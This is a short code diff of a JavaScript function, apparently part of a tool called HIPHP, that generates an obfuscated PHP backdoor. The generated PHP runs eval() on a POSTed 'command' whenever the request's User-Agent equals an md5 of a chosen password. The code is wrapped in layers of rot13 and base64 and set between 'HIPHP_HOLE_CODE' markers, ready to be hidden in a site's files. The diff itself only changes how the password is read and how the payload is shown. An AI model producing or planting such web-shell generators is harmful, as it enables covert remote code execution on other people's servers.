@@ -23,14 +23,19 @@ function tobase64(text){
 }
 
 //
-function geth(key){
+function geth(){
+    var key=document.getElementById("passwd").value;
     key = md5(key);
     code="if($_SERVER['HTTP_USER_AGENT']=='"+key+"'){echo'#"+key+"';if(isset($_POST['command'])){eval($_POST['command']);}exit;}";
     code=rot13(tobase64(rot13(tobase64(rot13(code)))));
     code="eval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('"+code+"'))))));";
     php_s="/*HIPHP_HOLE_CODE START*/";
     php_e="/*HIPHP_HOLE_CODE END*/";
-    return php_s+"\n"+code+"\n"+php_e;
+
+    //document.getElementById("h").innerHTML=php_s+"\n"+code+"\n"+php_e;
+
+    prompt("HIPHP_HOLE_CODE:",php_s+"\n"+code+"\n"+php_e);
+    //return php_s+"\n"+code+"\n"+php_e;
 }
 
 //console.log(geth("123"));
